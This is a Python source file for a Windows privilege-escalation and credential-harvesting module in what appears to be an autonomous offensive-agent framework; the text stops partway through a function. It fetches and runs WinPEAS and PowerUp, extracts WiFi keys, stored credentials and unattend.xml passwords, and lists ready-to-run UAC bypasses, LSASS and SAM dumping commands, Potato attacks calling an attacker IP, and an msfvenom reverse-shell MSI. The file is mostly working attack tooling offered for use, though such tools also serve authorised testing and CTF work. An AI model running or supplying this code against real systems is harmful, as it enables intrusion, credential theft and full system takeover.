"""
KRYON Windows Privilege Escalation Module
==========================================

Windows privilege escalation enumeration and exploitation tools.
Inspired by WinPEAS, PowerUp, and windows-privesc-check.

Primary Users:
- T-800 Infiltrator (Alpha-Red)
- T-1000 Advanced Hunter (Omega-Strike)
"""

import re
from typing import Any

from skynet.tools.common import generic_linux_command


def enumerate_windows_privesc() -> dict[str, Any]:
    """
    Comprehensive Windows privilege escalation enumeration.

    Returns:
        Dictionary with enumeration results

    Example:
        >>> results = enumerate_windows_privesc()
    """
    result = {
        "success": False,
        "system_info": {},
        "unquoted_services": [],
        "weak_permissions": [],
        "auto_logon": {},
        "always_install_elevated": False,
        "scheduled_tasks": [],
        "error": None,
    }

    try:
        # System information
        result["system_info"] = _get_windows_system_info()

        # Find unquoted service paths
        unquoted_result = find_unquoted_service_paths()
        if unquoted_result.get("success"):
            result["unquoted_services"] = unquoted_result.get("services", [])

        # Check weak service permissions
        weak_result = check_weak_service_permissions()
        if weak_result.get("success"):
            result["weak_permissions"] = weak_result.get("services", [])

        # Find auto-logon credentials
        autologon_result = find_auto_logon_credentials()
        if autologon_result.get("success"):
            result["auto_logon"] = autologon_result.get("credentials", {})

        # Check AlwaysInstallElevated
        elevated_result = check_always_install_elevated()
        if elevated_result.get("success"):
            result["always_install_elevated"] = elevated_result.get("enabled", False)

        # Enumerate scheduled tasks
        tasks_result = enumerate_scheduled_tasks()
        if tasks_result.get("success"):
            result["scheduled_tasks"] = tasks_result.get("tasks", [])

        result["success"] = True

    except Exception as e:
        result["error"] = str(e)

    return result


def find_unquoted_service_paths() -> dict[str, Any]:
    """
    Find Windows services with unquoted paths containing spaces.

    Returns:
        Dictionary with unquoted service paths

    Example:
        >>> services = find_unquoted_service_paths()
    """
    result = {"success": False, "services": [], "count": 0, "error": None}

    try:
        # Use wmic to query services
        cmd = 'wmic service get name,pathname,displayname,startmode | findstr /i "auto" | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """'

        cmd_result = generic_linux_command("cmd.exe", f"/c {cmd}")

        if cmd_result.get("success"):
            output = cmd_result.get("output", "")

            services = []
            for line in output.split("\n"):
                line = line.strip()
                if line and " " in line:
                    # Parse service information
                    services.append(line)

            result["services"] = services
            result["count"] = len(services)
            result["success"] = True
        else:
            result["error"] = cmd_result.get("error", "wmic command failed")

    except Exception as e:
        result["error"] = str(e)

    return result


def check_weak_service_permissions() -> dict[str, Any]:
    """
    Check for services with weak file permissions.

    Returns:
        Dictionary with services having weak permissions

    Example:
        >>> weak_services = check_weak_service_permissions()
    """
    result = {"success": False, "services": [], "count": 0, "error": None}

    try:
        # Use PowerShell to check service permissions
        ps_cmd = """
        Get-WmiObject win32_service | Where-Object {$_.pathname -notmatch '\"' -and $_.pathname -notmatch 'C:\\Windows'} |
        Select-Object Name, DisplayName, PathName, StartMode | Format-List
        """

        cmd_result = generic_linux_command("powershell.exe", f'-Command "{ps_cmd}"')

        if cmd_result.get("success"):
            output = cmd_result.get("output", "")
            result["services"] = output.split("\n")
            result["count"] = len([s for s in result["services"] if s.strip()])
            result["success"] = True
        else:
            result["error"] = cmd_result.get("error", "PowerShell command failed")

    except Exception as e:
        result["error"] = str(e)

    return result


def find_auto_logon_credentials() -> dict[str, Any]:
    """
    Search for Windows auto-logon credentials in registry.

    Returns:
        Dictionary with auto-logon credentials if found

    Example:
        >>> creds = find_auto_logon_credentials()
    """
    result = {"success": False, "credentials": {}, "found": False, "error": None}

    try:
        # Check registry for auto-logon settings
        reg_path = "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"

        # Query registry values
        values_to_check = ["DefaultUserName", "DefaultPassword", "DefaultDomainName"]

        credentials = {}
        for value in values_to_check:
            cmd_result = generic_linux_command("reg", f'query "{reg_path}" /v {value}')

            if cmd_result.get("success"):
                output = cmd_result.get("output", "")
                # Parse registry output
                if "REG_SZ" in output:
                    # Extract value
                    match = re.search(r"REG_SZ\s+(.+)", output)
                    if match:
                        credentials[value] = match.group(1).strip()

        if credentials:
            result["found"] = True
            result["credentials"] = credentials

        result["success"] = True

    except Exception as e:
        result["error"] = str(e)

    return result


def check_always_install_elevated() -> dict[str, Any]:
    """
    Check if AlwaysInstallElevated registry keys are set.

    Returns:
        Dictionary indicating if AlwaysInstallElevated is enabled

    Example:
        >>> elevated = check_always_install_elevated()
    """
    result = {
        "success": False,
        "enabled": False,
        "hklm_set": False,
        "hkcu_set": False,
        "error": None,
    }

    try:
        # Check HKLM key
        cmd_result = generic_linux_command(
            "reg",
            'query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer" /v AlwaysInstallElevated',
        )

        if cmd_result.get("success"):
            output = cmd_result.get("output", "")
            if "0x1" in output:
                result["hklm_set"] = True

        # Check HKCU key
        cmd_result = generic_linux_command(
            "reg",
            'query "HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer" /v AlwaysInstallElevated',
        )

        if cmd_result.get("success"):
            output = cmd_result.get("output", "")
            if "0x1" in output:
                result["hkcu_set"] = True

        # Both must be set for the vulnerability
        if result["hklm_set"] and result["hkcu_set"]:
            result["enabled"] = True

        result["success"] = True

    except Exception as e:
        result["error"] = str(e)

    return result


def enumerate_scheduled_tasks() -> dict[str, Any]:
    """
    Enumerate Windows scheduled tasks and check for weak permissions.

    Returns:
        Dictionary with scheduled tasks

    Example:
        >>> tasks = enumerate_scheduled_tasks()
    """
    result = {"success": False, "tasks": [], "writable_tasks": [], "error": None}

    try:
        # List all scheduled tasks
        cmd_result = generic_linux_command("schtasks", "/query /fo LIST /v")

        if cmd_result.get("success"):
            output = cmd_result.get("output", "")
            result["tasks"] = output.split("\n")

            # Look for tasks running as SYSTEM
            system_tasks = []
            current_task = {}

            for line in result["tasks"]:
                if "TaskName:" in line:
                    if current_task:
                        if current_task.get("run_as") == "SYSTEM":
                            system_tasks.append(current_task)
                    current_task = {"name": line.split(":", 1)[1].strip()}
                elif "Run As User:" in line:
                    current_task["run_as"] = line.split(":", 1)[1].strip()
                elif "Task To Run:" in line:
                    current_task["command"] = line.split(":", 1)[1].strip()

            if current_task and current_task.get("run_as") == "SYSTEM":
                system_tasks.append(current_task)

            result["writable_tasks"] = system_tasks
            result["success"] = True
        else:
            result["error"] = cmd_result.get("error", "schtasks command failed")

    except Exception as e:
        result["error"] = str(e)

    return result


def check_token_privileges() -> dict[str, Any]:
    """
    Check current token privileges for potential abuse.

    Returns:
        Dictionary with token privileges

    Example:
        >>> privs = check_token_privileges()
    """
    result = {"success": False, "privileges": [], "dangerous_privs": [], "error": None}

    try:
        # Use whoami to check privileges
        cmd_result = generic_linux_command("whoami", "/priv")

        if cmd_result.get("success"):
            output = cmd_result.get("output", "")
            result["privileges"] = output.split("\n")

            # Dangerous privileges that can be abused
            dangerous = [
                "SeImpersonatePrivilege",
                "SeAssignPrimaryTokenPrivilege",
                "SeTcbPrivilege",
                "SeBackupPrivilege",
                "SeRestorePrivilege",
                "SeCreateTokenPrivilege",
                "SeLoadDriverPrivilege",
                "SeTakeOwnershipPrivilege",
                "SeDebugPrivilege",
            ]

            for priv in dangerous:
                for line in result["privileges"]:
                    if priv in line and "Enabled" in line:
                        result["dangerous_privs"].append(priv)

            result["success"] = True
        else:
            result["error"] = cmd_result.get("error", "whoami command failed")

    except Exception as e:
        result["error"] = str(e)

    return result


def find_stored_credentials() -> dict[str, Any]:
    """
    Search for stored credentials on Windows system.

    Returns:
        Dictionary with found credentials

    Example:
        >>> creds = find_stored_credentials()
    """
    result = {
        "success": False,
        "cmdkey": [],
        "credential_manager": [],
        "unattend_files": [],
        "error": None,
    }

    try:
        # Check cmdkey stored credentials
        cmd_result = generic_linux_command("cmdkey", "/list")
        if cmd_result.get("success"):
            result["cmdkey"] = cmd_result.get("output", "").split("\n")

        # Search for unattend.xml files
        unattend_paths = [
            "C:\\Windows\\Panther\\Unattend.xml",
            "C:\\Windows\\Panther\\Unattended.xml",
            "C:\\Windows\\System32\\Sysprep\\unattend.xml",
            "C:\\Windows\\System32\\Sysprep\\Panther\\unattend.xml",
        ]

        for path in unattend_paths:
            cmd_result = generic_linux_command("type", path)
            if cmd_result.get("success"):
                content = cmd_result.get("output", "")
                if content:
                    result["unattend_files"].append({"path": path, "content": content})

        result["success"] = True

    except Exception as e:
        result["error"] = str(e)

    return result


# Helper functions


def _get_windows_system_info() -> dict[str, str]:
    """Get basic Windows system information."""
    info = {}

    commands = {
        "hostname": "hostname",
        "systeminfo": "systeminfo",
        "user": "whoami",
        "groups": "whoami /groups",
        "privileges": "whoami /priv",
    }

    for key, cmd in commands.items():
        parts = cmd.split()
        result = generic_linux_command(parts[0], " ".join(parts[1:]) if len(parts) > 1 else "")
        if result.get("success"):
            info[key] = result.get("output", "").strip()

    return info


# ============================================================================
# ENHANCED WINDOWS PRIVILEGE ESCALATION TOOLS (Phase 15)
# ============================================================================
# Added: January 22, 2025
# Purpose: Complete Windows privilege escalation capability matching Linux tools
# ============================================================================


def run_winpeas(
    output_file: str = "C:\\temp\\winpeas.txt", thorough: bool = False, quiet: bool = False
) -> dict[str, Any]:
    """
    Execute WinPEAS (Windows Privilege Escalation Awesome Script).

    Downloads and runs WinPEAS, parses output for critical findings including:
    - System information and patches
    - User privileges and groups
    - Scheduled tasks vulnerabilities
    - Service misconfigurations
    - Registry keys with sensitive data
    - Network information
    - Installed applications
    - Credentials in files

    Args:
        output_file: Path to save WinPEAS output (default: C:\\temp\\winpeas.txt)
        thorough: Run thorough scan (slower but more comprehensive)
        quiet: Suppress colored output for easier parsing

    Returns:
        Dictionary containing:
        - critical_findings: List of critical security issues
        - credentials_found: Any credentials discovered
        - misconfigurations: Registry and service misconfigurations
        - exploitable_services: Services with weak permissions
        - recommendations: Suggested exploitation paths

    Example:
        >>> # Basic WinPEAS scan
        >>> results = run_winpeas()
        >>> for finding in results['critical_findings']:
        ...     print(f"[!] {finding}")

        >>> # Thorough scan with custom output
        >>> results = run_winpeas(
        ...     output_file="C:\\temp\\winpeas_detailed.txt",
        ...     thorough=True
        ... )

        >>> # Quick scan for CTF
        >>> results = run_winpeas(quiet=True)
        >>> if results['credentials_found']:
        ...     print(f"Credentials: {results['credentials_found']}")

    Primary Users:
    - T-800 Infiltrator (Alpha-Red): Windows exploitation
    - CTF Master (Alpha-Crimson): CTF Windows targets
    - T-1000 Hunter (Alpha-Gold): Vulnerability research
    """
    import os
    import subprocess

    results = {
        "success": False,
        "critical_findings": [],
        "credentials_found": [],
        "misconfigurations": [],
        "exploitable_services": [],
        "recommendations": [],
        "output_file": output_file,
        "error": None,
    }

    try:
        # WinPEAS download URL
        winpeas_url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe"
        winpeas_local = "C:\\temp\\winpeas.exe"

        # Create temp directory if it doesn't exist
        os.makedirs("C:\\temp", exist_ok=True)

        # Download WinPEAS
        print("[*] Downloading WinPEAS...")
        download_cmd = f'powershell -Command "Invoke-WebRequest -Uri {winpeas_url} -OutFile {winpeas_local}"'

        download_result = subprocess.run(download_cmd, shell=True, capture_output=True, text=True, timeout=60)

        if download_result.returncode != 0:
            results["error"] = "Failed to download WinPEAS"
            return results

        # Build WinPEAS command
        cmd_parts = [winpeas_local]

        if quiet:
            cmd_parts.append("quiet")

        if thorough:
            cmd_parts.append("full")

        cmd_parts.append(f"> {output_file}")

        cmd = " ".join(cmd_parts)

        print("[*] Running WinPEAS...")

        # Execute WinPEAS
        subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=600,  # 10 minute timeout for thorough scan
        )

        # Read output file
        if os.path.exists(output_file):
            with open(output_file, encoding="utf-8", errors="ignore") as f:
                output = f.read()

            # Parse output for critical findings
            lines = output.split("\n")

            for _i, line in enumerate(lines):
                line_lower = line.lower()

                # Critical findings patterns
                if any(pattern in line_lower for pattern in ["[!]", "exploitable", "misconfigured", "weak"]):
                    results["critical_findings"].append(line.strip())

                # Credential patterns
                if any(pattern in line_lower for pattern in ["password", "credential", "apikey", "token"]):
                    # Look for actual values (not just headers)
                    if "=" in line or ":" in line:
                        results["credentials_found"].append(line.strip())

                # Service misconfigurations
                if "modifiable service" in line_lower or "unquoted" in line_lower:
                    results["exploitable_services"].append(line.strip())

                # Registry misconfigurations
                if "alwaysinstallelevated" in line_lower or "autologon" in line_lower:
                    results["misconfigurations"].append(line.strip())

            # Generate recommendations based on findings
            if results["exploitable_services"]:
                results["recommendations"].append(
                    "Exploitable services found - check service binary paths and permissions"
                )

            if results["credentials_found"]:
                results["recommendations"].append(
                    "Credentials found - try using them for privilege escalation or lateral movement"
                )

            if any("alwaysinstallelevated" in m.lower() for m in results["misconfigurations"]):
                results["recommendations"].append(
                    "AlwaysInstallElevated enabled - create malicious MSI for privilege escalation"
                )

            results["success"] = True

        else:
            results["error"] = "WinPEAS output file not created"

    except subprocess.TimeoutExpired:
        results["error"] = "WinPEAS execution timed out"
    except Exception as e:
        results["error"] = str(e)

    return results


def run_powerup() -> dict[str, Any]:
    """
    Execute PowerUp.ps1 privilege escalation checks.

    PowerUp is a PowerShell script that performs common Windows privilege
    escalation checks including:
    - Service vulnerabilities (unquoted paths, weak permissions)
    - Registry auto-logon credentials
    - AlwaysInstallElevated policy
    - Scheduled tasks with weak permissions
    - DLL hijacking opportunities

    Returns:
        Dictionary containing:
        - service_vulns: Exploitable service misconfigurations
        - registry_vulns: Registry-based vulnerabilities
        - dll_hijacking: DLL hijacking opportunities
        - autologon_creds: Auto-logon credentials if found
        - recommendations: Exploitation suggestions

    Example:
        >>> # Run PowerUp checks
        >>> results = run_powerup()
        >>>
        >>> # Check for service vulnerabilities
        >>> if results['service_vulns']:
        ...     print("Exploitable services:")
        ...     for svc in results['service_vulns']:
        ...         print(f"  - {svc['name']}: {svc['abuse_function']}")
        >>>
        >>> # Check for auto-logon credentials
        >>> if results['autologon_creds']:
        ...     print(f"Username: {results['autologon_creds'].get('username')}")
        ...     print(f"Password: {results['autologon_creds'].get('password')}")

    Primary Users:
    - T-800 Infiltrator (Alpha-Red): Windows exploitation
    - CTF Master (Alpha-Crimson): CTF Windows challenges
    """
    import os
    import re
    import subprocess

    results = {
        "success": False,
        "service_vulns": [],
        "registry_vulns": [],
        "dll_hijacking": [],
        "autologon_creds": {},
        "always_install_elevated": False,
        "recommendations": [],
        "error": None,
    }

    try:
        # PowerUp download URL
        powerup_url = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1"
        powerup_local = "C:\\temp\\PowerUp.ps1"

        # Create temp directory
        os.makedirs("C:\\temp", exist_ok=True)

        # Download PowerUp
        print("[*] Downloading PowerUp.ps1...")
        download_cmd = f'powershell -Command "Invoke-WebRequest -Uri {powerup_url} -OutFile {powerup_local}"'

        download_result = subprocess.run(download_cmd, shell=True, capture_output=True, text=True, timeout=60)

        if download_result.returncode != 0:
            results["error"] = "Failed to download PowerUp"
            return results

        # Execute PowerUp - Invoke-AllChecks
        print("[*] Running PowerUp checks...")
        powerup_cmd = f'powershell -ExecutionPolicy Bypass -File {powerup_local} -Command "Invoke-AllChecks"'

        powerup_result = subprocess.run(
            powerup_cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=300,  # 5 minute timeout
        )

        output = powerup_result.stdout

        # Parse output for vulnerabilities

        # Service vulnerabilities
        service_pattern = r"ServiceName\s*:\s*(\S+).*?AbuseFunction\s*:\s*([^\n]+)"
        for match in re.finditer(service_pattern, output, re.DOTALL):
            results["service_vulns"].append({"name": match.group(1), "abuse_function": match.group(2).strip()})

        # AlwaysInstallElevated
        if "AlwaysInstallElevated" in output and "Enabled" in output:
            results["always_install_elevated"] = True
            results["registry_vulns"].append("AlwaysInstallElevated")

        # Auto-logon credentials
        username_match = re.search(r"DefaultUserName\s*:\s*(\S+)", output)
        password_match = re.search(r"DefaultPassword\s*:\s*(\S+)", output)

        if username_match and password_match:
            results["autologon_creds"] = {
                "username": username_match.group(1),
                "password": password_match.group(1),
            }

        # DLL hijacking
        dll_pattern = r"ModifiablePath\s*:\s*([^\n]+)"
        for match in re.finditer(dll_pattern, output):
            results["dll_hijacking"].append(match.group(1).strip())

        # Generate recommendations
        if results["service_vulns"]:
            results["recommendations"].append(f"Found {len(results['service_vulns'])} exploitable services")
            results["recommendations"].append(f"Run: {results['service_vulns'][0]['abuse_function']}")

        if results["always_install_elevated"]:
            results["recommendations"].append(
                "AlwaysInstallElevated enabled - create malicious MSI: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi > evil.msi"
            )

        if results["autologon_creds"]:
            results["recommendations"].append(
                f"Auto-logon credentials found - try: runas /user:{results['autologon_creds']['username']} cmd.exe"
            )

        results["success"] = True

    except subprocess.TimeoutExpired:
        results["error"] = "PowerUp execution timed out"
    except Exception as e:
        results["error"] = str(e)

    return results


def check_uac_bypasses() -> dict[str, Any]:
    """
    Check for available UAC (User Access Control) bypass techniques.

    Tests for common UAC bypass methods including:
    - FodHelper (Windows 10)
    - eventvwr (Event Viewer)
    - CompMgmtLauncher (Computer Management)
    - sdclt (Backup and Restore)
    - SilentCleanup (Disk Cleanup)

    Returns:
        Dictionary containing:
        - available_bypasses: List of applicable UAC bypass methods
        - commands: Ready-to-execute bypass commands
        - os_version: Windows version for compatibility check
        - recommendations: Step-by-step exploitation guide

    Example:
        >>> # Check for UAC bypasses
        >>> bypasses = check_uac_bypasses()
        >>>
        >>> if bypasses['available_bypasses']:
        ...     print(f"Found {len(bypasses['available_bypasses'])} UAC bypasses:")
        ...     for bypass in bypasses['available_bypasses']:
        ...         print(f"  - {bypass['name']} ({bypass['os_version']})")
        ...         print(f"    Command: {bypass['command']}")

        >>> # Execute first bypass
        >>> if bypasses['commands']:
        ...     print(f"Execute: {bypasses['commands'][0]}")

    Primary Users:
    - T-800 Infiltrator (Alpha-Red): UAC bypass during exploitation
    - CTF Master (Alpha-Crimson): Windows CTF challenges
    """
    import subprocess

    results = {
        "success": False,
        "available_bypasses": [],
        "commands": [],
        "os_version": "",
        "is_admin": False,
        "recommendations": [],
        "error": None,
    }

    try:
        # Get Windows version
        ver_result = subprocess.run("ver", shell=True, capture_output=True, text=True)

        results["os_version"] = ver_result.stdout.strip()

        # Check if already admin
        admin_check = subprocess.run('net session 2>&1 | find "Access is denied" >nul', shell=True)

        results["is_admin"] = admin_check.returncode != 0

        if results["is_admin"]:
            results["recommendations"].append("Already running as administrator - UAC bypass not needed")
            results["success"] = True
            return results

        # Define UAC bypass techniques
        bypasses = [
            {
                "name": "FodHelper",
                "os_version": "Windows 10",
                "description": "Fodhelper.exe UAC bypass using registry",
                "command": 'REG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d "cmd.exe" /f && REG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /f && fodhelper.exe',
                "cleanup": "REG DELETE HKCU\\Software\\Classes\\ms-settings /f",
            },
            {
                "name": "eventvwr",
                "os_version": "Windows 7/10",
                "description": "Event Viewer UAC bypass using registry",
                "command": 'REG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d "cmd.exe" /f && eventvwr.exe',
                "cleanup": "REG DELETE HKCU\\Software\\Classes\\mscfile /f",
            },
            {
                "name": "CompMgmtLauncher",
                "os_version": "Windows 10",
                "description": "Computer Management Launcher bypass",
                "command": 'REG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d "cmd.exe" /f && CompMgmtLauncher.exe',
                "cleanup": "REG DELETE HKCU\\Software\\Classes\\mscfile /f",
            },
            {
                "name": "sdclt",
                "os_version": "Windows 10",
                "description": "Backup and Restore UAC bypass",
                "command": 'REG ADD HKCU\\Software\\Classes\\exefile\\shell\\open\\command /d "cmd.exe" /f && REG ADD HKCU\\Software\\Classes\\exefile\\shell\\open\\command /v DelegateExecute /f && sdclt.exe /KickOffElev',
                "cleanup": "REG DELETE HKCU\\Software\\Classes\\exefile /f",
            },
            {
                "name": "SilentCleanup",
                "os_version": "Windows 10",
                "description": "Disk Cleanup scheduled task bypass",
                "command": 'REG ADD "HKCU\\Environment" /v "windir" /d "cmd.exe /c REM " /f && schtasks /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I',
                "cleanup": 'REG DELETE "HKCU\\Environment" /v "windir" /f',
            },
        ]

        # Check which bypasses are available
        for bypass in bypasses:
            # Simple compatibility check based on OS version
            if "Windows 10" in results["os_version"] or "Windows 7" in bypass["os_version"]:
                results["available_bypasses"].append(bypass)
                results["commands"].append(bypass["command"])

        if results["available_bypasses"]:
            results["recommendations"].append(
                f"Found {len(results['available_bypasses'])} applicable UAC bypass techniques"
            )
            results["recommendations"].append(f"Try: {results['available_bypasses'][0]['name']} bypass")
            results["recommendations"].append(f"Execute: {results['commands'][0]}")
            results["recommendations"].append(f"Cleanup: {results['available_bypasses'][0]['cleanup']}")

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def harvest_credentials() -> dict[str, Any]:
    """
    Harvest credentials from Windows system.

    Searches for credentials in multiple locations:
    - SAM/SYSTEM registry hives (requires SYSTEM)
    - LSA secrets
    - Cached domain credentials
    - WiFi passwords
    - Browser saved passwords
    - Credential Manager
    - Unattend.xml files
    - Configuration files

    Returns:
        Dictionary containing:
        - wifi_passwords: Saved WiFi passwords
        - cached_credentials: Cached logon credentials
        - lsa_secrets: LSA secret data (if accessible)
        - browser_creds: Browser saved credentials
        - config_creds: Credentials from config files
        - recommendations: Next steps for credential abuse

    Example:
        >>> # Harvest all credentials
        >>> creds = harvest_credentials()
        >>>
        >>> # Check WiFi passwords
        >>> if creds['wifi_passwords']:
        ...     for wifi in creds['wifi_passwords']:
        ...         print(f"SSID: {wifi['ssid']}, Password: {wifi['password']}")
        >>>
        >>> # Check cached credentials
        >>> if creds['cached_credentials']:
        ...     for cred in creds['cached_credentials']:
        ...         print(f"User: {cred}")

        >>> # Search for specific patterns
        >>> creds = harvest_credentials()
        >>> if creds['config_creds']:
        ...     print(f"Found credentials in {len(creds['config_creds'])} files")

    Primary Users:
    - T-800 Infiltrator (Alpha-Red): Credential theft
    - T-1000 Hunter (Alpha-Gold): Post-exploitation
    - CTF Master (Alpha-Crimson): CTF credential challenges
    """
    import os
    import re
    import subprocess

    results = {
        "success": False,
        "wifi_passwords": [],
        "cached_credentials": [],
        "lsa_secrets": [],
        "browser_creds": [],
        "config_creds": [],
        "unattend_files": [],
        "recommendations": [],
        "error": None,
    }

    try:
        # 1. Harvest WiFi passwords
        print("[*] Extracting WiFi passwords...")
        wifi_result = subprocess.run("netsh wlan show profiles", shell=True, capture_output=True, text=True)

        if wifi_result.returncode == 0:
            profiles = re.findall(r"All User Profile\s*:\s*(.+)", wifi_result.stdout)

            for profile in profiles:
                profile = profile.strip()
                # Get password for each profile
                pwd_result = subprocess.run(
                    f'netsh wlan show profile name="{profile}" key=clear',
                    shell=True,
                    capture_output=True,
                    text=True,
                )

                password_match = re.search(r"Key Content\s*:\s*(.+)", pwd_result.stdout)
                if password_match:
                    results["wifi_passwords"].append({"ssid": profile, "password": password_match.group(1).strip()})

        # 2. Check cached credentials
        print("[*] Checking cached credentials...")
        cmdkey_result = subprocess.run("cmdkey /list", shell=True, capture_output=True, text=True)

        if cmdkey_result.returncode == 0:
            creds = re.findall(r"Target:\s*(.+)", cmdkey_result.stdout)
            results["cached_credentials"] = [c.strip() for c in creds]

        # 3. Search for unattend.xml files
        print("[*] Searching for unattend.xml files...")
        unattend_paths = [
            "C:\\Windows\\Panther\\Unattend.xml",
            "C:\\Windows\\Panther\\Unattended.xml",
            "C:\\Windows\\System32\\Sysprep\\unattend.xml",
            "C:\\Windows\\System32\\Sysprep\\Panther\\unattend.xml",
        ]

        for path in unattend_paths:
            if os.path.exists(path):
                try:
                    with open(path, encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                        # Look for password tags
                        passwords = re.findall(r"<Password>(.+?)</Password>", content)
                        if passwords:
                            results["unattend_files"].append({"path": path, "passwords": passwords})
                except Exception:
                    pass

        # 4. Search common config files for credentials
        print("[*] Searching configuration files...")
        search_paths = [
            "C:\\inetpub\\wwwroot\\web.config",
            "C:\\xampp\\htdocs\\config.php",
            "C:\\Program Files\\*\\config.ini",
            "C:\\Users\\*\\Documents\\*.txt",
        ]

        for search_path in search_paths:
            try:
                # Use PowerShell to search files
                ps_cmd = f'Get-ChildItem -Path "{search_path}" -File -ErrorAction SilentlyContinue | Select-String -Pattern "password|pwd|apikey" | Select-Object -First 10'

                search_result = subprocess.run(
                    f'powershell -Command "{ps_cmd}"',
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30,
                )

                if search_result.returncode == 0 and search_result.stdout:
                    results["config_creds"].append(
                        {"search_path": search_path, "matches": search_result.stdout.strip()}
                    )
            except Exception:
                pass

        # Generate recommendations
        if results["wifi_passwords"]:
            results["recommendations"].append(
                f"Found {len(results['wifi_passwords'])} WiFi passwords - potential password reuse"
            )

        if results["cached_credentials"]:
            results["recommendations"].append(f"Found {len(results['cached_credentials'])} cached credentials")

        if results["unattend_files"]:
            results["recommendations"].append(
                "Unattend.xml files found with credentials - check for administrator passwords"
            )

        if results["config_creds"]:
            results["recommendations"].append(
                f"Found credentials in {len(results['config_creds'])} configuration files"
            )

        if not any(
            [
                results["wifi_passwords"],
                results["cached_credentials"],
                results["unattend_files"],
                results["config_creds"],
            ]
        ):
            results["recommendations"].append(
                "No obvious credentials found - try running as SYSTEM for LSA secrets/SAM dump"
            )

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def check_token_privileges_enhanced() -> dict[str, Any]:
    """
    Enhanced token privilege checking with exploitation guidance.

    Checks for dangerous Windows token privileges and provides specific
    exploitation techniques for each, including:
    - SeImpersonatePrivilege (Potato attacks)
    - SeAssignPrimaryTokenPrivilege (Token manipulation)
    - SeDebugPrivilege (Process injection)
    - SeBackupPrivilege (File system access)
    - SeRestorePrivilege (Registry modification)
    - SeLoadDriverPrivilege (Kernel driver loading)
    - SeTakeOwnershipPrivilege (File ownership)

    Returns:
        Dictionary containing:
        - privileges: All current token privileges
        - dangerous_privileges: Exploitable privileges with details
        - exploitation_methods: Step-by-step exploitation guides
        - potato_attacks: Available Potato attack variants
        - recommendations: Prioritized exploitation paths

    Example:
        >>> # Check token privileges
        >>> privs = check_token_privileges_enhanced()
        >>>
        >>> if privs['dangerous_privileges']:
        ...     for priv in privs['dangerous_privileges']:
        ...         print(f"[!] {priv['name']}: {priv['description']}")
        ...         print(f"    Exploit: {priv['exploit_method']}")
        >>>
        >>> # Check for Potato attacks
        >>> if privs['potato_attacks']:
        ...     print(f"Use: {privs['potato_attacks'][0]['command']}")

    Primary Users:
    - T-800 Infiltrator (Alpha-Red): Token privilege exploitation
    - CTF Master (Alpha-Crimson): Windows CTF privesc challenges
    """
    import subprocess

    results = {
        "success": False,
        "privileges": [],
        "dangerous_privileges": [],
        "exploitation_methods": {},
        "potato_attacks": [],
        "recommendations": [],
        "error": None,
    }

    try:
        # Get current privileges
        priv_result = subprocess.run("whoami /priv", shell=True, capture_output=True, text=True)

        if priv_result.returncode != 0:
            results["error"] = "Failed to get token privileges"
            return results

        output = priv_result.stdout
        results["privileges"] = output.split("\n")

        # Define dangerous privileges with exploitation details
        dangerous_privs = {
            "SeImpersonatePrivilege": {
                "description": "Impersonate a client after authentication",
                "exploit_method": "Potato attacks (JuicyPotato, RoguePotato, PrintSpoofer)",
                "severity": "CRITICAL",
                "commands": [
                    "JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}",
                    "PrintSpoofer.exe -i -c cmd",
                    "RoguePotato.exe -r <attacker_ip> -e cmd.exe",
                ],
            },
            "SeAssignPrimaryTokenPrivilege": {
                "description": "Replace a process's primary token",
                "exploit_method": "Token manipulation with Potato attacks",
                "severity": "CRITICAL",
                "commands": ["Similar to SeImpersonatePrivilege - use Potato attacks"],
            },
            "SeTcbPrivilege": {
                "description": "Act as part of the operating system",
                "exploit_method": "Direct SYSTEM shell creation",
                "severity": "CRITICAL",
                "commands": ["psexec -i -s cmd.exe"],
            },
            "SeDebugPrivilege": {
                "description": "Debug and adjust memory of other processes",
                "exploit_method": "Process injection, LSASS dumping",
                "severity": "HIGH",
                "commands": ["procdump.exe -ma lsass.exe lsass.dmp", "Invoke-Mimikatz -DumpCreds"],
            },
            "SeBackupPrivilege": {
                "description": "Backup files and directories",
                "exploit_method": "Copy sensitive files (SAM, SYSTEM, ntds.dit)",
                "severity": "HIGH",
                "commands": ["reg save HKLM\\SAM sam.save", "reg save HKLM\\SYSTEM system.save"],
            },
            "SeRestorePrivilege": {
                "description": "Restore files and directories",
                "exploit_method": "Modify system files and registry",
                "severity": "HIGH",
                "commands": ["Modify critical system files or registry keys"],
            },
            "SeLoadDriverPrivilege": {
                "description": "Load and unload device drivers",
                "exploit_method": "Load malicious kernel driver for SYSTEM",
                "severity": "CRITICAL",
                "commands": ["Use Capcom.sys or similar vulnerable driver"],
            },
            "SeTakeOwnershipPrivilege": {
                "description": "Take ownership of files or objects",
                "exploit_method": "Take ownership of system files",
                "severity": "MEDIUM",
                "commands": [
                    "takeown /f C:\\Windows\\System32\\config\\SAM",
                    "icacls C:\\Windows\\System32\\config\\SAM /grant %username%:F",
                ],
            },
        }

        # Check which dangerous privileges are enabled
        for line in output.split("\n"):
            for priv_name, priv_info in dangerous_privs.items():
                if priv_name in line and "Enabled" in line:
                    priv_data = {
                        "name": priv_name,
                        "description": priv_info["description"],
                        "exploit_method": priv_info["exploit_method"],
                        "severity": priv_info["severity"],
                        "commands": priv_info["commands"],
                    }
                    results["dangerous_privileges"].append(priv_data)
                    results["exploitation_methods"][priv_name] = priv_info

